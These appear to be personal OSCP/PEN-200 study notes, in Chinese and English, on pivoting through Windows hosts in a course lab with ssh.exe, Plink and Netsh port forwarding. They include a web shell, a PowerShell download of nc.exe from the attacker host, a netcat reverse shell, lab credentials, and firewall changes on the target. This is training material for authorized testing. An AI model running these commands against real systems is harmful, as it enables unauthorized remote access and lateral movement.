---
title: '[OSCP, PEN-200] Instructional notes - Part 5'
disqus: hackmd
---

[OSCP, PEN-200] Instructional notes - Part 5
===

# [Link back to: "[OSCP, PEN-200] Instructional notes - Part 1"](https://github.com/Chw41/OffSec-Certification/blob/main/%5BOSCP%2C%20PEN-200%5D%20Offensive%20Security%20Certified%20Professional%20/Instructional%20notes/README.md)
# [Link back to: "[OSCP, PEN-200] Instructional notes - Part 2"](https://github.com/Chw41/OffSec-Certification/blob/main/%5BOSCP%2C%20PEN-200%5D%20Offensive%20Security%20Certified%20Professional%20/Instructional%20notes/%5BOSCP%2C%20PEN-200%5D%20Instructional%20notes%20-%20Part%202.md)
# [Link back to: "[OSCP, PEN-200] Instructional notes - Part 3"](https://github.com/Chw41/OffSec-Certification/blob/main/%5BOSCP%2C%20PEN-200%5D%20Offensive%20Security%20Certified%20Professional%20/Instructional%20notes/%5BOSCP%2C%20PEN-200%5D%20Instructional%20notes%20-%20Part%203.md)
# [Link back to: "[OSCP, PEN-200] Instructional notes - Part 4"](https://github.com/Chw41/OffSec-Certification/blob/main/%5BOSCP%2C%20PEN-200%5D%20Offensive%20Security%20Certified%20Professional%20/Instructional%20notes/%5BOSCP%2C%20PEN-200%5D%20Instructional%20notes%20-%20Part%204.md)

>[!Caution]
> 接續 [[OSCP, PEN-200] Instructional notes - Part 4](https://github.com/Chw41/OffSec-Certification/blob/main/%5BOSCP%2C%20PEN-200%5D%20Offensive%20Security%20Certified%20Professional%20/Instructional%20notes/%5BOSCP%2C%20PEN-200%5D%20Instructional%20notes%20-%20Part%204.md) 內容

# Port Redirection and SSH Tunneling
## … SSH Tunneling ([Instructional notes - Part 4](https://hackmd.io/@CHW/rkjNgyi51x))
## Port Forwarding with Windows Tools
上述接說明 Linux-based 的 tunnel tools。 Windows 也有幾種 port forward 與 tunnel 的方法
### ssh.exe
Windows 內建 SSH: 自 2018 年 4 月 ([1803 版本](https://devblogs.microsoft.com/commandline/windows10v1803/#openssh-based-client-and-server)) 起內建 OpenSSH client，可以在 `%systemdrive%\Windows\System32\OpenSSH` 找到：
- ssh.exe
- scp.exe
- sftp.exe

這個 SSH client 可以用來連接任何支援 SSH 的伺服器（不限於 Windows SSH Server）

[環境範例]
- MULTISERVER03（Windows 機器） 只開放了 RDP 3389 port
- 可以 RDP 進入 MULTISERVER03，但無法直接綁定其他端口到外網。

解決方案：
- 在 MULTISERVER03 上使用 `ssh.exe`，建立一個 [Remote Dynamic Port Forwarding](https://hackmd.io/@CHW/rkjNgyi51x#SSH-Remote-Dynamic-Port-Forwarding)，讓流量通過 SSH Tunnel 回到 Kali 
- 這樣可以利用 SSH Kali 存取 PGDATABASE01（PostgreSQL 資料庫）

![image](https://hackmd.io/_uploads/SkLGpmNs1l.png)
#### 1. start the Kali SSH server
```
┌──(chw㉿CHW)-[~]
└─$ sudo systemctl start ssh
[sudo] password for chw:
```

可以用 `ss -ntplu` 查看啟用狀況

#### 2. 使用 [xfreerdp](https://www.freerdp.com/) 連接到 MULTISERVER03
```
┌──(chw㉿CHW)-[~]
└─$ xfreerdp /u:rdp_admin /p:P@ssw0rd! /v:192.168.131.64
[10:55:26:199] [372805:372806] [WARN][com.freerdp.crypto] - Certificate verification failure 'self-signed certificate (18)' at stack position 0
[10:55:26:199] [372805:372806] [WARN][com.freerdp.crypto] - CN = MULTISERVER03
...
```
![image](https://hackmd.io/_uploads/HyHJQoNoJe.png)

#### 3. 檢查 Windows SSH
打開 cmd.exe `where ssh` 確認是否有 SSH
```
C:\Users\rdp_admin>where ssh
C:\Windows\System32\OpenSSH\ssh.exe

C:\Users\rdp_admin>
```
檢查 SSH version
```
C:\Users\rdp_admin>ssh.exe -V
OpenSSH_for_Windows_8.1p1, LibreSSL 3.0.2
```
> OpenSSH version 高於 7.6，代表可以使用 remote dynamic port forwarding

#### 4. 創建 remote dynamic port forward 到 Kali
Windows 創建 remote dynamic port forward 到 Kali port 9998
```
C:\Users\rdp_admin>ssh -N -R 9998 chw@192.168.45.213
The authenticity of host '192.168.45.213 (192.168.45.213)' can't be established.
ECDSA key fingerprint is SHA256:Atuf88ckgvdjD92PblnxCBvzAiN1jtxNUv6woYcEmxg.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.45.213' (ECDSA) to the list of known hosts.
chw@192.168.45.213's password:
|
```

確認連線狀況
```
┌──(chw㉿CHW)-[~]
└─$ ss -ntplu
Netid       State         Recv-Q        Send-Q               Local Address:Port                Peer Address:Port       Process       
...
tcp         LISTEN        0             128                      127.0.0.1:9998                     0.0.0.0:*                        
tcp         LISTEN        0             128                        0.0.0.0:22                       0.0.0.0:*                        
tcp         LISTEN        0             128                          [::1]:9998                        [::]:*                        
tcp         LISTEN        0             128                           [::]:22                          [::]:*
```
#### 5. 配置 Proxychains
Kali 設定 SOCKS proxy
```
┌──(chw㉿CHW)-[~]
└─$ tail /etc/proxychains4.conf   
#         * raw: The traffic is simply forwarded to the proxy without modification.
#        ( auth types supported: "basic"-http  "user/pass"-socks )
#
[ProxyList]
# add proxy here ...
# meanwile
# defaults set to "tor"
#socks4         127.0.0.1 9050
#socks5 192.168.147.63 9999
socks5 127.0.0.1 9998
```
#### 6. 使用 Proxychains 透過 SSH 隧道連接 PostgreSQL
```
┌──(chw㉿CHW)-[~]
└─$ proxychains psql -h 10.4.131.215 -U postgres  

[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/aarch64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] Strict chain  ...  127.0.0.1:9998  ...  10.4.131.215:5432  ...  OK
Password for user postgres: 
[proxychains] Strict chain  ...  127.0.0.1:9998  ...  10.4.131.215:5432  ...  OK
psql (16.3 (Debian 16.3-1+b1), server 12.12 (Ubuntu 12.12-0ubuntu0.20.04.1))
SSL connection (protocol: TLSv1.3, cipher: TLS_AES_256_GCM_SHA384, compression: off)
Type "help" for help.

postgres=# \l
                                                        List of databases
    Name    |  Owner   | Encoding | Locale Provider |   Collate   |    Ctype    | ICU Locale | ICU Rules |   Access privileges   
------------+----------+----------+-----------------+-------------+-------------+------------+-----------+-----------------------
 confluence | postgres | UTF8     | libc            | en_US.UTF-8 | en_US.UTF-8 |            |           | 
 postgres   | postgres | UTF8     | libc            | en_US.UTF-8 | en_US.UTF-8 |            |           | 
 template0  | postgres | UTF8     | libc            | en_US.UTF-8 | en_US.UTF-8 |            |           | =c/postgres          +
            |          |          |                 |             |             |            |           | postgres=CTc/postgres
 template1  | postgres | UTF8     | libc            | en_US.UTF-8 | en_US.UTF-8 |            |           | =c/postgres          +
            |          |          |                 |             |             |            |           | postgres=CTc/postgres
(4 rows)
```
> 成功登入 PostgreSQL database

>[!Warning]
> Question: Log in to MULTISERVER03 with the rdp_admin credentials we found in the Confluence database (rdp_admin:P@ssw0rd!). Enumerate which port forwarding techniques are available, then use the Windows OpenSSH client to create a port forward that allows you to reach port 4141 on PGDATABASE01 from your Kali machine.\
> [file: [ssh_exe_exercise_client](https://offsec-platform-prod.s3.amazonaws.com/offsec-courses/PEN-200/extras/prat2/d5a2ba960124f3cf5089951b99445af5-ssh_exe_exercise_client_aarch64)]
> 解法：
> 1. 將 4141 port Tunnel 到 Kali 4141 port: `ssh -N -R 4141:10.4.131.215:4141 chw@192.168.45.213` 
> 2. `ss -ntplu` 確認連線狀況
> 3. Kali 上 `wget {file}`
> 4. `chmod +x {file}`
> 5. `./{file} -h 127.0.0.1 -p 4141`
> ![image](https://hackmd.io/_uploads/SJLY6jViJg.png)
> 6. `./{file} -i 127.0.0.1 -p 4141`: GET FLAG

### Plink
Administrators 會避免 OpenSSH 留在 Windows machine 上，因此我們不能保證能發現 OpenSSH Client\
在 OpenSSH 之前大多使用 [PuTTY](https://www.chiark.greenend.org.uk/~sgtatham/putty/latest.html) 與 cmd line 工具 [Plink](https://tartarus.org/~simon/putty-snapshots/htmldoc/Chapter7.html)
>[!Tip]
Plink (PuTTY Link) 是 PuTTY 的 cmd 版本，專為 Windows 環境設計的 SSH 客戶端。\
功能類似 OpenSSH client，但 不支援 Remote Dynamic Port Forwarding。\
由於 Windows 環境常見，也較少被防毒軟體偵測為惡意程式，因此在滲透測試中很有用。

[環境範例]
- 在內網發現了一台 Windows 伺服器 MULTISERVER03，它只開放了 TCP 80 ，其他端口都被防火牆擋住。 
- 無法直接使用 RDP 或 OpenSSH client 連回 Kali 機器，但可以透過 HTTP Web Shell 來執行命令。 
- 目標透過 Plink 建立 Remote Port Forwarding，讓我們可以透過 Kali 連到內部服務 (如 PostgreSQL 伺服器)
- 首先需要透過 Web Shell 取得一個更穩定的 Reverse Shell。
- 執行 Plink 建立 Port Forwarding
- 在 Kali 透過 Plink 轉發的 Port 連接到 Windows RDP

![image](https://hackmd.io/_uploads/SJ6Sgh4syl.png)

#### 1. Web Shell
在 MULTISERVER03 的 Web Applicaiton 注入 Web Shell，
<img width="954" alt="image" src="https://github.com/user-attachments/assets/b4d3a9d7-768e-490f-8bbd-489424a461f5" />

LAB 環境已經幫我們注入 Web Shell\
http://192.168.226.64/umbraco/forms.aspx

![image](https://hackmd.io/_uploads/HJtdDKHi1g.png)
> user: `iis apppool\defaultapppool`

但現在環境 RDP 與 OpenSSH 皆被防火牆阻擋。導致沒辦法建立 remote port forward。

#### 2. 建立 Reverse shell
使用 Web shell 將 `nc.exe` 下載 到 MULTISERVER03，然後再使用 Reverse shell 傳送回 Kali 
##### 2.1 Kali 啟用 Apache2
在 Kali 中啟用 Apache2 Service，並放入 `nc.exe`
```
┌──(chw㉿CHW)-[~]
└─$ sudo systemctl start apache2
[sudo] password for chw: 

┌──(chw㉿CHW)-[~]
└─$ find / -name nc.exe 2>/dev/null
/usr/share/windows-resources/binaries/nc.exe
/usr/share/seclists/Web-Shells/FuzzDB/nc.exe

┌──(chw㉿CHW)-[~]
└─$ sudo cp /usr/share/windows-resources/binaries/nc.exe /var/www/html/
```
##### 2.2 透過 Web shell 將 nc.exe 下載 到 MULTISERVER03
```
powershell wget -Uri http://192.168.45.220/nc.exe -OutFile C:\Windows\Temp\nc.exe
```
> `wget -Uri`: 透過 HTTP 下載\
`-OutFile C:\Windows\Temp\nc.exe` : 儲存到 `C:\Windows\Temp`

##### 2.3 建立 Reverse shell
Kali 監聽：
```
┌──(chw㉿CHW)-[~]
└─$ nc -nvlp 8888          
listening on [any] 8888 ...

```
Weshell 執行 nc.exe
```
C:\Windows\Temp\nc.exe -e cmd.exe 192.168.45.220 8888
```
![image](https://hackmd.io/_uploads/Hy-p5Fri1x.png)

Kali 成功接收 Reverse shell
```
┌──(chw㉿CHW)-[~]
└─$ nc -nvlp 8888          
listening on [any] 8888 ...
connect to [192.168.45.220] from (UNKNOWN) [192.168.226.64] 59644
Microsoft Windows [Version 10.0.20348.1487]
(c) Microsoft Corporation. All rights reserved.

c:\windows\system32\inetsrv>

```
#### 3. 利用 Plink 建立 remote port forward
##### 3.1 與 `nc.exe` 相同步驟，載入 `plink.exe`
將 plink.exe 丟上 Kali Apache Service
```
┌──(chw㉿CHW)-[~]
└─$ find / -name plink.exe 2>/dev/null
/usr/share/windows-resources/binaries/plink.exe
                                                           
┌──(chw㉿CHW)-[~]
└─$ sudo cp /usr/share/windows-resources/binaries/plink.exe /var/www/html/

┌──(chw㉿CHW)-[~]
└─$ ls /var/www/html/
index.html  index.nginx-debian.html  nc.exe  plink.exe
```
因為我們已取得 MULTISERVER03 Reverse shell，可以直接在 Kali 操作，不用透過 Web Shell
```
c:\windows\system32\inetsrv>powershell wget -Uri http://192.168.45.220/plink.exe -OutFile C:\Windows\Temp\plink.exe
powershell wget -Uri http://192.168.45.220/plink.exe -OutFile C:\Windows\Temp\plink.exe
```

##### 3.2 使用 Plink 建立 remote port forwarding
設定 Plink remote port forwarding：
從 MULTISERVER03 RDP port 到 Kali 9833 port
>[!Tip]
> Plink 語法與 OpneSSH 非常相似\
> OpenSSH: `ssh -N -R 127.0.0.1:9833:10.4.195.215:3389 chw@192.168.45.220`

>[!Caution]
>This might log our `Kali password` somewhere undesirable! If we're in a hostile network, we may wish to **create a port-forwarding only user** on our Kali machine for remote port forwarding situations.
```
c:\windows\system32\inetsrv>C:\Windows\Temp\plink.exe -ssh -l chw -pw {Your pwd} -R 127.0.0.1:9833:127.0.0.1:3389 192.168.45.220
C:\Windows\Temp\plink.exe -ssh -l chw -pw {Your pwd} -R 127.0.0.1:9833:127.0.0.1:3389 192.168.45.220
The host key is not cached for this server:
  192.168.45.220 (port 22)
You have no guarantee that the server is the computer you
think it is.
The server's ssh-ed25519 key fingerprint is:
  ssh-ed25519 255 SHA256:eyUOKg67H7A1p1DUMuysCB4PMQ7Ht5/QPJehWoA32z4
If you trust this host, enter "y" to add the key to Plink's
cache and carry on connecting.
If you want to carry on connecting just once, without adding
the key to the cache, enter "n".
If you do not trust this host, press Return to abandon the
connection.
Store key in cache? (y/n, Return cancels connection, i for more info) y
Using username "chw".
Linux CHW 6.8.11-arm64 #1 SMP Kali 6.8.11-1kali2 (2024-05-30) aarch64

The programs included with the Kali GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Kali GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Wed Mar  5 03:38:52 2025 from 192.168.226.64
┌──(chw㉿CHW)-[~]
└─$
```
> `-ssh`: 使用 SSH 連線到 Kali\
`-l chw`: 使用者名稱 chw\
`-pw {Your pwd}`: SSH 登入密碼\
`-R 127.0.0.1:9833:127.0.0.1:3389`: Remote Port Forwarding 在 Kali 的 127.0.0.1:9833 上開啟端口轉發到 MULTISERVER03 本機的 127.0.0.1:3389 (RDP)\
`192.168.45.220`: Kali 的 IP

驗證連線狀態：
```
┌──(chw㉿CHW)-[~]
└─$ ss -ntplu
Netid  State   Recv-Q  Send-Q   Local Address:Port    Peer Address:Port Process 
...
tcp    LISTEN  0       128          127.0.0.1:9833         0.0.0.0:*            
tcp    LISTEN  0       128            0.0.0.0:22           0.0.0.0:*            
tcp    LISTEN  0       128               [::]:22              [::]:*            
tcp    LISTEN  0       511                  *:80                 *:*
```
> 成功建立 port forwarding 9833 port
> > 也能觀察到上述建立的 Apache 80 port

![image](https://hackmd.io/_uploads/r1nVxcroJl.png)
> Kali 在  loopback interface 開啟了 9833 port

#### 4. 登入 RDP
```
┌──(chw㉿CHW)-[~]
└─$ xfreerdp /u:rdp_admin /p:P@ssw0rd! /v:127.0.0.1:9833
[03:58:52:657] [543810:543811] [WARN][com.freerdp.crypto] - Certificate verification failure 'self-signed certificate (18)' at stack position 0
[03:58:52:657] [543810:543811] [WARN][com.freerdp.crypto] - CN = MULTISERVER03
```
![image](https://hackmd.io/_uploads/H1jqG5Bi1g.png)

### Netsh
Netsh 是 Windows 內建的網路管理工具 (也稱為Network Shell)，可用來設定防火牆、IP 配置、port forward 等功能。netsh interface [portproxy](https://learn.microsoft.com/en-us/windows-server/networking/technologies/netsh/netsh-interface-portproxy) 可用來 建立端口轉發規則，將一個 IP/Port 的流量轉發到另一個 IP/Port。
對於內網滲透很有用，當無法直接存取目標伺服器時，可透過 Netsh 建立跳板機 (Pivoting)。
- [Netsh command syntax, contexts, and formatting](https://learn.microsoft.com/en-us/windows-server/networking/technologies/netsh/netsh-contexts#subcontexts)

[環境範例]
- MULTISERVER03 的防火牆阻擋了大部分的入站連線。
- MULTISERVER03 允許 TCP 3389 (RDP) 連線，所以我們可以 使用 RDP 來登入 Windows。
- MULTISERVER03 沒有 OpenSSH，所以我們無法透過 `ssh.exe` 或 `Plink` 進行 Port Forwarding。

解決方案：
- 使用 Netsh 建立 Port Forwarding，讓外部設備可以透過 MULTISERVER03 連線到 PGDATABASE01

![image](https://hackmd.io/_uploads/S1rgyjriyx.png)

#### 1. 登入 MULTISERVER03 RDP
```
┌──(chw㉿CHW)-[~]
└─$ xfreerdp /u:rdp_admin /p:P@ssw0rd! /v:192.168.226.64
[05:15:03:063] [580395:580396] [WARN][com.freerdp.crypto] - Certificate verification failure 'self-signed certificate (18)' at stack position 0
[05:15:03:063] [580395:580396] [WARN][com.freerdp.crypto] - CN = MULTISERVER03
```

#### 2. 設定 Netsh Port Forwarding
在 RDP 中使用 Administrator 開啟 `cmd.exe`\
```
C:\Windows\system32>netsh interface portproxy add v4tov4 listenport=2222 listenaddress=192.168.226.64 connectport=22 connectaddress=10.4.226.215
```
> `listenport=2222`: 設定監聽流量 port 2222\
`listenaddress=192.168.50.64`: 設定監聽 IP\
`connectport=22`: 流量將被轉發到 Target Machine SSH Service port 22
`connectaddress=10.4.50.215`: Target Machine 的內網 IP

以上表示當我們連線到 MULTISERVER03 的 2222 端口時，流量會被轉發到 PGDATABASE01 的 22 端口

使用 `netstat` 檢查 Port 是否在監聽
```
C:\Windows\system32>netstat -anp TCP | find "2222"
  TCP    192.168.226.64:2222    0.0.0.0:0              LISTENING
```
也可以使用 `netsh interface portproxy` 檢查配置
```
C:\Windows\system32>netsh interface portproxy show all

Listen on ipv4:             Connect to ipv4:

Address         Port        Address         Port
--------------- ----------  --------------- ----------
192.168.226.64  2222        10.4.226.215    22
```
> 代表 MULTISERVER03 會將 2222 port 的流量轉發到 PGDATABASE01 的 SSH (22 port)

![image](https://hackmd.io/_uploads/S1CvhoHoke.png)

串聯好 MULTISERVER03 到 PGDATABASE01 的 port forwarding，但 Kali 只能透過 RDP，仍然無法連線到 2222 port

使用 nmap 驗證：
```
┌──(chw㉿CHW)-[~]
└─$ sudo nmap -sS 192.168.226.64 -Pn -n -p2222
[sudo] password for chw: 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-05 05:52 EST
Nmap scan report for 192.168.226.64
Host is up.

PORT     STATE    SERVICE
2222/tcp filtered EtherNetIP-1

Nmap done: 1 IP address (1 host up) scanned in 2.07 seconds
```
![image](https://hackmd.io/_uploads/S1YVasHs1x.png)
> 我們有 RDP，可以嘗試調整 Firewall

#### 3. 調整 Windows 防火牆
```
C:\Windows\system32>netsh advfirewall firewall add rule name="port_forward_ssh_2222" protocol=TCP dir=in localip=192.168.226.64 localport=2222 action=allow
Ok.
```
> `netsh advfirewall firewall add rule`: 在 Windows 防火牆中新增規則\
`name="port_forward_ssh_2222"`: 設定規則名稱\
`protocol=TCP`: 只允許 TCP 連線\
`dir=in`: 規則適用於 Inbound 連線\
`localip=192.168.226.64`: 只允許連線到本機 IP\
`localport=2222`: 允許 2222 port\
`action=allow`: 允許規則通過

再一次使用 nmap 驗證：
```
┌──(chw㉿CHW)-[~]
└─$ sudo nmap -sS 192.168.226.64 -Pn -n -p2222
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-05 06:02 EST
Nmap scan report for 192.168.226.64
Host is up (0.13s latency).

PORT     STATE SERVICE
2222/tcp open  EtherNetIP-1

Nmap done: 1 IP address (1 host up) scanned in 0.20 seconds
```
> STATE: open

#### 4. SSH 連線 Port Forwarding 
```
┌──(chw㉿CHW)-[~]
└─$ ssh database_admin@192.168.226.64 -p2222
The authenticity of host '[192.168.226.64]:2222 ([192.168.226.64]:2222)' can't be established.
ED25519 key fingerprint is SHA256:oPdvAJ7Txfp9xOUIqtVL/5lFO+4RY5XiHvVrZuisbfg.
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:14: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
...
Last login: Thu Feb 16 21:49:42 2023 from 10.4.50.63
database_admin@pgdatabase01:~$ 
```
![image](https://hackmd.io/_uploads/BJFeghHiyg.png)

#### 5. 復原環境
- 刪除防火牆規則
```
C:\Windows\system32>netsh advfirewall firewall delete rule name="port_forward_ssh_2222"

Deleted 1 rule(s).
Ok.
```
- 刪除 Port Forwarding
```
C:\Windows\system32>netsh interface portproxy del v4tov4 listenport=2222 listenaddress=192.168.226.64
```
# Tunneling Through Deep Packet Inspection
